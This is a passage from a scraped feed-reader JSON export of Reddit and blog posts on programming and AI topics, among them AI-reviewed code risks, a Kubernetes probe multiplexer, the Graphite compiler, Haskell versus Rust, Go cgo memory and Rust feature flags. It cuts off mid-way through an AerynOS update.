larger picture.</p><p>Moreover, more and more non-technical folks are “vibe-coding” their projects into existence. They’re developing software based on intuition, requirements, and AI prompts, and don’t have a deep understanding of the actual code that’s being generated.</p><p>I’ve seen it first-hand, on LinkedIn, Reddit, and even TikTok! Just Google “vibe-coding” and see how popular it has become.</p><p>What happens when a “vibe-coded” library is used by thousands of developers, and these issues start infesting all of our software? <strong>If I nearly missed a critical bug and I actually wrote the code, how many bugs will exist because code wasn’t written by engineers with domain expertise?</strong></p><p>I shudder to think of that future.</p><p>So if you’re a tech executive, don’t fire your engineering team yet. They may be more critical now than ever before.</p><p>Maybe my brain is overreacting.</p><p>Maybe I would’ve caught this issue well before I launched. I’m just having trouble figuring out </p><p>In this case, <strong>I knew of the limitation because I wrote the library. </strong>But there are hundreds of libraries now being created and reviewed purely by AI. Engineers are looking at less and less of the code that is brought into the world.</p><p>And this should terrify you.</p><p>For backtesting software, the consequences of this bug would’ve been an improper test. Users would be annoyed and leave bad reviews. I would suffer reputational harm. But I would survive.</p><p>But imagine such a bug for other, mission-critical software, like rocket ships and self-driving cars.</p><p>This article demonstrates why human beings still need to be in the loop when developing complex software systems. <strong>It is imperative, that human-beings sanity-check LLM-generated code with domain-aware unit tests.</strong> Even the best AI models don’t fully grasp exactly what we’re building.</p><p>So before you ship that feature (whose code you barely glanced at), ask yourself this question: what assumption did you and Gemini miss?</p>","contentLength":7382,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1louou5/this_is_why_you_cant_trust_ai_to_review_your/"},{"title":"[D] Any path for a mid career/mid aged MLE to do ML research in the industry","url":"https://www.reddit.com/r/MachineLearning/comments/1lotkac/d_any_path_for_a_mid_careermid_aged_mle_to_do_ml/","date":1751347501,"author":"/u/LastAd3056","guid":178727,"unread":true,"content":"<p>I've seen some flavor of questions here about whether they should do a PhD to join a research lab. I have a slightly different question. I did a non-CS PhD almost a decade ago, failed to get a faculty position after a bunch of postdocs and then meandered through FANG jobs, first in DS and then in MLE. I did some applied research in my last job, but more stats heavy than ML. But through a bunch of layoffs and restructuring, currently I am in a more traditional MLE role, think recommendation systems, A/B tests, move metrics...</p><p>But at my heart, I still want to do research. I've dabbled with writing a single author paper in on the top ML conferences in my own time, but its kinda hard, with job, family etc.. Even if I do manage to pull it off, will the one off Neurips paper (lets say) help me get an entry card to a more research-y ML job, like a Research Scientist/ Research Engineer in a ML lab? I am competing with ML PhDs with multiple papers, networks etc.</p><p>I also think that I don't have a lot of time, most of my friends have moved on to management after a decade of IC roles, and thats sort of the traditional path. But part of me is still holding on and wants to give it a shot and see if I can break into research this late, without an ML PhD. I know I will be much more fulfilled as a research scientist, compared to a regular SWE/M job,. I am currently trying to use my weekends and nights to write a single author paper to submit to one of the top conferences. Worst case I get rejected.</p><p>Some thoughts in my mind: (1) I have also thought of writing workshop papers, which are easier to get accepted, but I doubt they have a similar value in the RS job market.<p> (2) Research Engineer will likely be easier than Research Scientist. But how should I strategize for this?</p></p><p>I'd be grateful if I get thoughts on how I should strategize a move. Feel free to also tell me its impossible, and I should cut my losses and move on.</p>","contentLength":1931,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"One-Minute Daily AI News 6/30/2025","url":"https://www.reddit.com/r/artificial/comments/1lot1gv/oneminute_daily_ai_news_6302025/","date":1751345620,"author":"/u/Excellent-Target-847","guid":178967,"unread":true,"content":"   submitted by   <a href=\"https://www.reddit.com/user/Excellent-Target-847\"> /u/Excellent-Target-847 </a>","contentLength":43,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"My Claude collaborative platform","url":"https://www.reddit.com/r/kubernetes/comments/1losxzq/my_claude_collaborative_platform/","date":1751345283,"author":"/u/MuscleLazy","guid":178667,"unread":true,"content":"<p>I've been using Claude Desktop a lot and wanted a better way to manage different collaboration styles, like having it act as an engineer vs researcher vs creative partner.</p><p> (the default) forgets everything between conversations. You start fresh every time, explain your preferences, coding style, whatever. Gets old fast.</p><p> (with memory) actually remembers your working style, project context, and collaboration preferences. Game changer for long-term work.</p><p>I've been using this setup for about 3 months now with the engineer profile and it dramatically improved my workflow.</p><p>: Every conversation started with me explaining \"I need root cause analysis first, minimal code changes, focus on production safety, don't over-engineer solutions.\" Then spending the first 10 messages training Claude to give me direct technical responses instead of hand-holding explanations.</p><p>: Claude immediately knows I want systematic troubleshooting, that I prefer infrastructure optimization over quick fixes, and that I need definitive technical communication without hedging language.</p><p>The platform tracks our  from incident reviews and  where it documents lessons learned from outages, alternative approaches we considered but didn't implement, and insights about our infrastructure.</p><p>I've thoroughly tested the  profile for production incidents, while spending a lot less time on \"tuning\" the other profiles, you are welcome to contribute. It is striking to see how Claude transforms from a junior engineer, constantly performing unauthorized commands or file edits, into a \"cold\", \"precise like a surgeon's scalpel\" engineer. No more \"You're right!\" messages, Claude will actually tell you where you're wrong, straight up! Claude's <a href=\"https://github.com/axivo/claude/blob/main/docs/images/profile-user-drift.png\"></a> to <a href=\"https://github.com/axivo/claude/blob/main/docs/profile-engineer.md#profile-drift-correction\"></a>. 🧑‍💻</p><p>The most spectacular improvements are the conversation logs and Claude's diary, Claude will not be shy to write any dumb mistakes you did, priceless.</p><p>The repo has all the details, examples, and documentation. Worth checking out if you're tired of re-training Claude on every conversation.</p>","contentLength":2012,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] Inference-Time Scaling and Collective Intelligence for Frontier AI","url":"https://www.reddit.com/r/MachineLearning/comments/1los6wj/r_inferencetime_scaling_and_collective/","date":1751342705,"author":"/u/iwiwijp","guid":178629,"unread":true,"content":"<p>TL;DR: our AB-MCTS lets multiple frontier models work together at inference time, outperforming each model running alone on the ARC-AGI-2 benchmark.</p><p>Our new inference-time scaling algorithm enables collective intelligence for AI by allowing multiple frontier models (like Gemini 2.5 Pro, o4-mini, DeepSeek-R1-0528) to cooperate.</p><p>Inspired by the power of human collective intelligence, where the greatest achievements arise from the collaboration of diverse minds, we believe the same principle applies to AI. Individual frontier models like ChatGPT, Gemini, and DeepSeek are remarkably advanced, each possessing unique strengths and biases stemming from their training, which we view as valuable resources for collective problem-solving.</p><p>AB-MCTS (Adaptive Branching Monte Carlo Tree Search) harnesses these individualities, allowing multiple models to cooperate and engage in effective trial-and-error, solving challenging problems for any single AI. Our initial results on the ARC-AGI-2 benchmark are promising, with AB-MCTS combining o4-mini + Gemini-2.5-Pro + R1-0528, current frontier AI models, significantly outperforming individual models by a substantial margin.</p><p>This research builds on our 2024 work on evolutionary model merging, shifting focus from “mixing to create” to “mixing to use” existing, powerful AIs. At Sakana AI, we remain committed to pioneering novel AI systems by applying nature-inspired principles such as evolution and collective intelligence. We believe this work represents a step toward a future where AI systems collaboratively tackle complex challenges, much like a team of human experts, unlocking new problem-solving capabilities and moving beyond single-model limitations.</p><p>If you have any questions, please ask them below or feel free to get in touch, any discussion is more than welcome :)</p>","contentLength":1830,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"probemux: When you need more than 1 {liveness, readiness}Probe","url":"https://www.reddit.com/r/kubernetes/comments/1lor7jp/probemux_when_you_need_more_than_1_liveness/","date":1751339521,"author":"/u/thockin","guid":178698,"unread":true,"content":"<div><p>There was an issue recently where someone argued that they REALLY DO need more than 1 livenessProbe, so I cobbled this together from bits of other programs:</p><p>NAME probemux - multiplex many HTTP probes into one.</p><p>SYNOPSIS probemux --port=&lt;port&gt; [OPTIONS]... BACKENDS...</p><pre><code>When the / URL is read, execute one HTTP GET operation against each backend URL and return the composite result. If all backends return a 2xx HTTP status, this will respond with 200 \"OK\". If all backends return valid HTTP responses, but any backend returns a non-2xx status, this will respond with 503 \"Service Unavailable\". If any backend produced an HTTP error, this will respond with 502 \"Bad Gateway\". Backends are probed synchronously when an incoming request is received, but backends may be probed in parallel to each other. </code></pre><pre><code>Probemux has exactly one required flag. --port The port number on which to listen. Probemux listens on the unspecified address (all IPs, all families). All other flags are optional. -?, -h, --help Print help text and exit. --man Print this manual and exit. --pprof Enable the pprof debug endpoints on probemux's port at /debug/pprof/... --timeout &lt;duration&gt; The time allowed for each backend to respond, formatted as a Go-style duration string. If not specified this defaults to 3 seconds (3s). -v, --verbose &lt;int&gt;, $GITSYNC_VERBOSE Set the log verbosity level. Logs at this level and lower will be printed. --version Print the version and exit. </code></pre><pre><code>probemux \\ --port=9376 \\ --timeout=5s \\ http://localhost:1234/healthz \\ http://localhost:1234/another \\ http://localhost:5678/a-third </code></pre></div>   submitted by   <a href=\"https://www.reddit.com/user/thockin\"> /u/thockin </a>","contentLength":1606,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Graphite (now a top-100 Rust project) turns Rust into a functional, visual scripting language for graphics operations — REQUESTING HELP to implement compiler bidirectional type inference","url":"https://www.reddit.com/r/rust/comments/1lor3b4/graphite_now_a_top100_rust_project_turns_rust/","date":1751339166,"author":"/u/Keavon","guid":177127,"unread":true,"content":"<p>Just now, <a href=\"https://graphite.rs\">Graphite</a> has broken into the top 100 Rust projects on GitHub by <a href=\"https://github.com/GraphiteEditor/Graphite/stargazers\">star</a> count, and it has been today's #1 <a href=\"https://github.com/trending?since=daily\">trending repo</a> on all of GitHub regardless of language.</p><p>It's a community-driven open source project that is a comprehensive 2D content creation tool for graphic design, digital art, and interactive real-time motion graphics. It also, refreshingly, has a high-quality UI design that is modern, intuitive, and user-friendly. The vision is to become the Blender equivalent of 2D creative tools. <a href=\"https://static.graphite.rs/content/index/sizzle-compilation.mp4\">Here's a 1-minute video</a> showing the cool, unique, visually snazzy things that can be made with it.</p><p>Graphite features a node-based procedural editing environment using a bespoke functional programming language, Graphene, that we have built on top of Rust itself such that it uses Rust's data types and  to transform artist-created documents into portable, standalone programs that can procedurally generate parametric artwork. Think: something spanning the gamut from Rive to ImageMagick.</p><p>For the juicy technical deets, give the <a href=\"https://www.youtube.com/watch?v=ZUbcwUC5lxA\">podcast episode</a> a listen where we were interviewed about how our Graphene engine/language lets even nontechnical artists \"paint with Rust\", sort of like if Scratch used Rust as its foundation. We go into detail on the unique approach of turning a graphics editor into a compiled programming language where the visual editor is like an IDE for Rust code.</p><h3>Here's the ask: help implement bidirectional type inference in our language's compiler</h3><p>The Graphene language — while it is built on top of Rust and uses Rust's compiler, data types, traits, and generics — also has its own type checker. It supports generics, but is somewhat rudimentary and needs to be made more powerful, such as implementing <a href=\"https://en.wikipedia.org/wiki/Hindley%E2%80%93Milner_type_system\">Hindley–Milner</a> or similar, in order for Graphene types to work with contextual inference just like Rust types do.</p><p>This involves the Graphene compiler internals and we <strong>only have one developer with a compilers background</strong> and he's a student with limited free time spread across all the crucial parts of the Graphite project's engineering. But we know that <a href=\"https://www.reddit.com/r/rust\">/r/rust</a> is — well... — naturally a place where many talented people who love building compilers and hobby language implementations hang out.</p><p>This type system project should last a few weeks for someone with the right background— but for more than a year, working around having full type inference support has been a growing impediment that is impacting how we can keep developing ergonomic graphics tooling. For example, a graphics operation can't accept two inputs and use the type of the first to pick a compatible generic type for the second. This results in painful workarounds that confuse users. Even if it's just a short-term involvement, even temporarily expanding our team beyond 1 knowledgeable compiler developer would have an outsized impact on helping us execute our mission to bring programmatic graphics (and Rust!) into the hands of artists.</p><p>If you can help, we will work closely with you to get you up to speed with the existing compiler code. If you're up for the fun and impactful challenge, the best way is to <a href=\"https://discord.graphite.rs\">join our project Discord</a> and say you'd like to help in our  channel. Or you can <a href=\"https://github.com/GraphiteEditor/Graphite/issues/1621\">comment on the GitHub issue</a>.</p><p>Besides compilers, we also need general help, especially in areas of our bottlenecks: code quality review, and helping design API surfaces and architecture plans for upcoming systems. If you're an experienced engineer who could help with any of those for a few hours a week, or with general feature development, please also come get involved! Graphite is one of the easiest open source projects to start contributing to according to many of our community members; we really strive to make it as frictionless as possible to <a href=\"https://graphite.rs/volunteer/guide/\">start out</a>. Feel free to drop by and leave a code review on any <a href=\"https://github.com/GraphiteEditor/Graphite/pulls\">open PRs</a> or ask what kind of task best fits your background (graphics, algorithm design, application programming, bug hunting, and of course most crucially: programming language compilers).</p><p>Thank you! Now let's go forth and get artists secretly addicted to Rust 😀 In no time at all, they will be writing custom Rust functions to do their own graphical operations.</p><p>P.S. If you are attending <a href=\"https://opensauce.com/\">Open Sauce</a> in a few weeks, come visit our booth. We'd love to chat (and give you swag).</p>","contentLength":4288,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Reflections on Haskell and Rust","url":"https://academy.fpblock.com/blog/rust-haskell-reflections/","date":1751338698,"author":"/u/sibip","guid":178839,"unread":true,"content":"<p>For most of my professional experience, I have been writing production\ncode in both Haskell and Rust, primarily focusing on web services,\nAPIs, and HTTP stack development. My journey started with Haskell,\nfollowed by working with Rust, and most recently returning to the\nHaskell ecosystem.</p><p>This experience has given me perspective on both languages' strengths\nand limitations in real-world applications. Each language has aspects\nthat I appreciate and miss when working with the other. This post\nexamines the features and characteristics that stand out to me in each\nlanguage.</p><p>Rust's ability to shadow variables seamlessly is something I came to\nappreciate. In Rust, you can write:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>This pattern is common and encouraged in Rust, making code more\nreadable by avoiding the need for intermediate variable names. In\nHaskell, you would typically need different names:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>Haskell's approach is slightly harder to read, while Rust's shadowing\nmakes transformation pipelines more natural.</p><p>Rust's enum system, particularly when combined with pattern matching,\nfeels more robust than Haskell's sum types of records. When defining\nsum types of records in Haskell, there is a possibility of introducing\npartial record accessors which can cause runtime crashes, though\nrecent versions of GHC now produce compile-time warnings for this\npattern:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>Rust eliminates this class of errors by design:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Rust allows multiple enum types to have the same variant names within\nthe same module, while Haskell's constructor names must be unique\nwithin their scope. This leads to different patterns in the two\nlanguages.</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>The same approach in Haskell would cause a compile error:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>In Haskell, you need unique constructor names:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>Alternatively, Haskell developers often use qualified imports syntax\nto achieve similar namespacing:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>The  syntax in Rust makes the intent clearer at the\nusage site. You immediately know which enum type you're working with,\nwhile Haskell's approach can sometimes require additional context or\nprefixing to achieve the same clarity.</p><p>Rust provides granular visibility control for struct fields, allowing\nyou to expose only specific fields while keeping others private. This\nfine-grained control is built into the language:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>Rust offers even more granular visibility control beyond simple \nand private fields. You can specify exactly where a field should be\naccessible:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>These granular visibility modifiers (, ,\n) allow you to create sophisticated access patterns that\nmatch your module hierarchy and architectural boundaries. Some of\nthese patterns are simply not possible to replicate in Haskell's\nmodule system.</p><p>In Haskell, record field visibility is controlled at the type level,\nnot the field level. This means you typically either export all of a\nrecord's fields at once (using ) or none of them. To achieve\nsimilar granular control, you need to use more awkward patterns:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>The Haskell approach requires writing boilerplate accessor functions\nand losing the convenient record syntax for the fields you want to\nkeep private. Rust's per-field visibility eliminates this awkwardness\nwhile maintaining the benefits of direct field access for public\nfields.</p><h2>Purity and Referential Transparency</h2><p>One of Haskell's most significant strengths is its commitment to\npurity. Pure functions, which have no side effects, are easier to\nreason about, test, and debug. Referential transparency—the principle\nthat a function call can be replaced by its resulting value without\nchanging the program's behavior—is a direct benefit of this purity.</p><p>In Haskell, the type system explicitly tracks effects through monads\nlike , making it clear which parts of the code interact with the\noutside world. This separation of pure and impure code is a powerful\ntool for building reliable software.</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>While Rust encourages a similar separation of concerns, it does not\nenforce it at the language level in the same way. A function in Rust\ncan perform I/O or mutate state without any explicit indication in its\ntype signature (beyond  for mutable borrows). This means that\nwhile you  write pure functions in Rust, the language doesn't\nprovide the same strong guarantees as Haskell.</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>This lack of enforced purity in Rust means you lose some of the strong\nreasoning and refactoring guarantees that are a hallmark of Haskell\ndevelopment.</p><p>Rust's explicit error handling through  removes the\ncognitive overhead of exceptions. Compare these approaches:</p><p>Haskell (with potential exceptions):</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>Rust (explicit throughout):</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>In Rust, the  operator makes error propagation clean while keeping\nthe flow clear.</p><h2>Unit tests as part of source code</h2><p>Rust's built-in support for unit tests within the same file as the\ncode being tested is convenient:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><p>In Haskell, tests are typically in separate files:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>Rust's co-location makes tests harder to forget and easier to\nmaintain. Additionally, in Haskell you often need to export internal\ntypes and functions from your modules just to make them accessible for\ntesting, which can pollute your public API.</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>Rust's  attribute means test code has access to private\nfunctions and types without exposing them publicly.</p><p>Rust's  provides a standard formatting tool that the entire\ncommunity has adopted:</p><pre data-lang=\"bash\"><code data-lang=\"bash\"></code></pre><p>In Haskell, while we have excellent tools like  and\n, the lack of a single standard has led to configuration\ndebates:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>I have witnessed significant time spent on style discussions when team\nmembers are reluctant to adopt formatting tools.</p><p>While Haskell Language Server (HLS) has improved significantly, it\nstill struggles with larger projects. Basic functionality like\nvariable renaming can fail in certain scenarios, particularly in\nTemplate Haskell heavy codebases.</p><p>rust-analyzer provides a more reliable experience across different\nproject sizes, with features like \"go to definition\" working\nconsistently even in large monorepos. One feature I'm particularly\nfond of is rust-analyzer's ability to jump into the definitions of\nstandard library functions and external dependencies. This seamless\nnavigation into library code is something I miss when using HLS, even\non smaller projects, where such functionality is not <a href=\"https://github.com/haskell/haskell-language-server/issues/708\">currently</a>\npossible.</p><p>Another feature I extensively use in rust-analyzer is the ability to\nrun tests inline directly from the editor. This functionality is\ncurrently missing in HLS, though there is an <a href=\"https://github.com/haskell/haskell-language-server/issues/3357\">open issue</a> tracking\nthis feature request.</p><p>Despite Rust's reputation for slow compilation, I've found it\nconsistently faster than Haskell for equivalent services. The Rust\nteam has made significant efforts to optimize the compiler over the\nyears, and these improvements are noticeable in practice. In contrast,\nHaskell compilation times have remained slow, and newer GHC versions\nunfortunately don't seem to provide meaningful improvements in this\narea.</p><h2>Interactive development experience</h2><p>I appreciate Haskell's REPL (Read-eval-print loop) for rapid\nprototyping and experimentation. Not having a native REPL in Rust\nnoticeably slows down development when you need to try things out\nquickly or explore library APIs interactively. In GHCi, you can load\nyour existing codebase and experiment around it, making it easy to\ntest functions, try different inputs, and explore how your code\nbehaves.</p><p>As an alternative, I have been using <a href=\"https://github.com/emacs-rustic/rustic?tab=readme-ov-file#org-babel\">org babel in rustic mode</a> for\ninteractive Rust development. While this provides some level of\ninteractivity within Emacs, it feels more like a band-aid than an\nactual solution for quickly experimenting with code. The workflow is\nmore cumbersome compared to the direct approach of typing expressions\ndirectly into GHCi and seeing results instantly.</p><h2>Lists as first-class citizens</h2><p>Haskell's treatment of lists as first-class citizens through special\nsyntax can be problematic. The convenient  syntax defaults to\nlinked lists:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>Better alternatives exist but require more verbose syntax:</p><pre data-lang=\"haskell\"><code data-lang=\"haskell\"></code></pre><p>While Haskell has the  extension to make this more\nconvenient, it hasn't enjoyed the same widespread adoption as\n.</p><p>Rust also has <a href=\"https://doc.rust-lang.org/std/collections/struct.LinkedList.html\"></a> in its standard library, but it comes\nwith clear documentation discouraging its use:</p><pre data-lang=\"rust\"><code data-lang=\"rust\"></code></pre><h2>Configuration file experience</h2><p>Cabal and TOML represent different approaches to project\nconfiguration. While cabal's tool support has improved greatly with\nHLS integration, which now supports features like automatic formatting\nusing cabal-gild, TOML enjoys broader ecosystem support.</p><p>TOML benefits from independent language servers like <a href=\"https://github.com/tamasfe/taplo\">taplo</a> and\nthe recent <a href=\"https://github.com/tombi-toml/tombi\">tombi</a>, providing a superior editing\nexperience. Features like jumping to different Cargo.toml files across\na workspace or seeing descriptions of specific Cargo.toml fields on\nhover work seamlessly.</p><p>Additionally, TOML has upstream support in editors like Emacs through\ntoml-ts-mode, which takes advantage of tree-sitter. No equivalent\nexists for cabal files, likely due to the format's limited popularity\noutside the Haskell ecosystem.</p><p>It's worth noting that when Cabal was created, there was likely no\nwidely adopted standard configuration format available. Rust had the\nbenefit of coming later and choosing an existing, well-established\nformat rather than inventing something new.</p><p>I handle production operations for both Rust and Haskell services,\nincluding parts of the Stackage infrastructure at FP Complete (which\nFP Complete later donated to the Haskell Foundation). I have\nencountered significantly more operational challenges with Haskell\nservices.</p><p>Haskell services often require tweaking GHC's RTS (Runtime system)\nparameters to avoid memory issues and achieve stable performance. This\nremains an ongoing challenge - recently, Bryan from the Haskell\nFoundation team opened a <a href=\"https://github.com/commercialhaskell/stackage-server/issues/354\">similar issue</a> on the Stackage server,\nencountering the same type of issue I dealt with. In contrast, Rust\nservices have been much easier to operate.</p><p>Building static binaries is trivial in Rust, and the ecosystem\nactively works to reduce non-Rust dependencies. Recent efforts like\nthe <a href=\"https://trifectatech.org/blog/bzip2-crate-switches-from-c-to-rust/\">bzip2 crate switching from C to Rust</a> further simplify the\nbuild process by removing C library dependencies wherever possible.</p><p>Cross-compilation to ARM is particularly straightforward. For one of\nour clients, we run all production services on ARM\narchitecture. Setting up the entire cross-compilation pipeline took\nless than a day. I would not be confident about achieving the same\nwith GHC and the various commonly used dependencies in Hackage.</p><p>The build process is quite simple:</p><pre data-lang=\"bash\"><code data-lang=\"bash\"></code></pre><p>My experience has been that Rust services typically consume less\nmemory and CPU cycles than the Haskell ones in general.</p><p>Both languages have their place in the software development\necosystem. However, I find that Rust's larger user base brings\ntangible benefits through more robust tooling and actively maintained\nlibraries. I used to reach for Haskell when writing CLI tools,\nappreciating its expressiveness. These days, I find myself choosing\nRust instead, largely due to how polished libraries like  have\nbecome for command-line parsing.</p><p>While I appreciate that Haskell's theoretical foundations remain\nstrong for exploring effect systems and advanced type-level\nprogramming, I observe that its library ecosystem has become less\nactive compared to Rust's rapidly evolving landscape.</p><p>For the web services and API development I work on, I find that Rust's\npractical decisions around error handling, tooling, and operational\naspects often result in more maintainable and deployable systems.\nWhile language choice always depends on numerous factors like team\nexpertise and project requirements, Rust's powerful combination of\ndesign and ecosystem makes it a compelling option. For me, it has\nbecome the pragmatic choice for building reliable software,\nspecifically when a greenfield project is involved.</p><p><a href=\"https://blogtrottr.com/?subscribe=https://www.fpcomplete.com/feed/\" target=\"_blank\">\n      Subscribe to our blog via email\n    </a><small>Email subscriptions come from our <a target=\"_blank\" href=\"https://academy.fpblock.com/feed/\">Atom feed</a> and are handled by <a target=\"_blank\" href=\"https://blogtrottr.com\">Blogtrottr</a>. You will only receive notifications of blog posts,\n      and can unsubscribe any time.</small></p><p>Do you like this blog post and need help with Next Generation Software Engineering, Platform\n    Engineering or Blockchain &amp; Smart Contracts? <a href=\"https://academy.fpblock.com/contact-us/\">Contact us</a>.</p>","contentLength":11920,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/rust/comments/1loqxty/reflections_on_haskell_and_rust/"},{"title":"Heap Management with Go & Cgo","url":"https://www.reddit.com/r/golang/comments/1loqmgt/heap_management_with_go_cgo/","date":1751337712,"author":"/u/winwaed","guid":178700,"unread":true,"content":"<p>I think I know the answer, but a bit of a sanity check,,,</p><p>I'm a relative Go Newbie. We have a Go app running in a Docker (Ubuntu) container. This calls a C/C++ library (C interface, but C++ under the hood) via cgo. Yes I am aware of the dangers of that, but this library depends on a 3rd party C++ library and uses x64 intrinsics. The 3rd party library is slowly being ported to Go but it isn't ready yet for prime time; and of course there's the time to port our library to Golang: I've seen worse, but not trivial either!</p><p>Memory allocation is a potential issue, and I will investigate the latest GC options. Most of the memory allocation is in the C++ library (potentially many GB). Am I right in thinking that the C++ memory allocation will be separate from Golang's heap? And Golang does not set any limits on the library allocations? (other than OS-wide ulimit settings of course)</p><p>In other words, both Golang and the C++ library will take all the physical memory they can? And allocate/manage memory independently of each other?</p>","contentLength":1030,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"TIL features can't be used like this and I think it's nuking my incremental build times","url":"https://www.reddit.com/r/rust/comments/1loqbol/til_features_cant_be_used_like_this_and_i_think/","date":1751336805,"author":"/u/Tiflotin","guid":178726,"unread":true,"content":"<p>I'm making a mmorpg that has several shared types between client and server. I have 3 crates, client, server, shared.</p><p>Item, is one of those types for example. Item has 2 fields `id` and `amount`. I want to change the type of the field based off what crate is using the shared crate. Eg the client, the `id` field should be of type u16. But in the server, I want the `id` type to be a `ItemId` (enum repr u16 type for item constants). The client can't use the same type since `ItemId` wont always be up to date with the latest items in game (we can add items without releasing new client updates).</p><p>This is what I've got so far, and its fine when building the specific crate (eg client or server) but if u try to build the workspace itself, it fails.</p><pre><code>pub struct Item { pub id: ItemIdType, } #[cfg(not(feature = \"server\"))] pub type ItemIdType = u16; #[cfg(feature = \"server\")] pub type ItemIdType = String; </code></pre><p>Example use of client with u16 type: ```rust use shared::Item;</p><p>fn main() { // Client project, NO server feature let test = Item { id: 123 }; println!( \"We are a u16 since we're NOT using the server feature! {:?}\", test.id ); } ```</p><p>Example use of server with String type: ```rust use shared::Item;</p><p>fn main() { // Server project, YES server feature let test = Item { id: String::from(\"Hello\"), }; println!( \"We are a String since we ARE using the server feature! {:?}\", test.id ); } ```</p><p>My issue is when running cargo build in the workspace, it gives an error saying client was failed to build due to incorrect item id type. But if I run cargo build inside the client directory it works fine.</p><p><code> error[E0308]: mismatched types --&gt; client/src/main.rs:5:27 | 5 | let test = Item { id: 123 }; | ^^^- help: try using a conversion method: `.to_string()` | | | expected `String`, found integer </code></p><p>I don't really understand why this isnt valid, and not quite sure how to achieve what I want without duplicating the struct inside server and client. It's got me stumped!</p>","contentLength":1951,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Is Tech Schools Backend MasterClass outdated or worth it?","url":"https://www.reddit.com/r/golang/comments/1looc0q/is_tech_schools_backend_masterclass_outdated_or/","date":1751330875,"author":"/u/stewrat1","guid":179077,"unread":true,"content":"<p>I am starting to learn Go and I found this course from Tech School: </p><p>What interested me about this course was the AWS, Docker and Kubernetes usage in it too- as it seems quite industrious and valuable. My only concern is if it is outdated as I saw on YouTube, the original series was made 5 years ago. </p><p>Anyone take this course recently or have other suggestion for learning? </p>","contentLength":373,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] best chunking method for financial reports?","url":"https://www.reddit.com/r/MachineLearning/comments/1loob3z/d_best_chunking_method_for_financial_reports/","date":1751330799,"author":"/u/Wickkkkid","guid":177069,"unread":true,"content":"<p>Hey all, I'm working on a RAG (Retrieval-Augmented Generation) pipeline focused on financial reports (e.g. earnings reports, annual filings). I’ve already handled parsing using a combo of PyMuPDF and a visual LLM to extract structured info from text, tables, and charts — so now I have the content clean and extracted.</p><p>My issue: I’m stuck on choosing the right chunking strategy. I've seen fixed-size chunks (like 500 tokens), sliding windows, sentence/paragraph-based, and some use semantic chunking with embeddings — but I’m not sure what works best for this kind of data-heavy, structured content.</p><p>Has anyone here done chunking specifically for financial docs? What’s worked well in your RAG setups?</p><p>Appreciate any insights 🙏</p>","contentLength":740,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[D] How far are we from LLM pattern recognition being as good as designed ML models","url":"https://www.reddit.com/r/MachineLearning/comments/1loo8yl/d_how_far_are_we_from_llm_pattern_recognition/","date":1751330623,"author":"/u/chrisfathead1","guid":178899,"unread":true,"content":"<p>LLMs are getting better quickly. It seems like every time a new release comes out, they have moved faster than I anticipated. </p><p>Are they great at abstract code, integrating systems, etc? Not yet. But I do find that they are excellent at data processing tasks and machine learning code, especially for someone who knows and understands those concepts and is able to understand when the LLM has given a wrong or inefficient answer.</p><p>I think that one day, LLMs will be good enough to perform as well as a ML model that was designed using traditional processes. For example, I had to create a model that predicted call outcomes in a call center. It took me months to get the data exactly like I needed it from the system and identify the best transformation, combinations of features, and model architecture to optimize the performance.</p><p>I wonder how soon I'll be able to feed 50k records to an LLM, and tell it look at these records and teach yourself how to predict X. Then I'll give you 10k records and I want to see how accurate your predictions are and it will perform as well or better than the model I spent months working on. </p><p>Again I have no doubt that we'll get to this point some day, I'm just wondering if you all think that's gonna happen in 2 years or 20. Or 50? </p>","contentLength":1266,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"AerynOS: Mid-year update","url":"https://aerynos.com/blog/2025/06/30/mid-year-update/","date":1751328580,"author":"/u/NomadicCore","guid":178701,"unread":true,"content":"<p>As we hit the middle of the year, it’s time for another update for those of you following along with AerynOS’s development.</p><p>Over the last few months, things may have seemed unusually quiet, however rest assured that there has been A LOT going on in the background. As such, we are preparing a short series of blog posts to go over the relevant topics in the coming weeks.</p><p>For this blog post, we are going to cover our infrastructure port, along with the process of rebuilding our entire package repository.</p><ul><li>All core AerynOS tooling is now written in Rust</li><li>Every recipe in the repository has been rebuilt (twice!) with many packages then having been updated to newer versions after the rebuilds were completed</li><li>A CDN has been implemented for faster package installation and 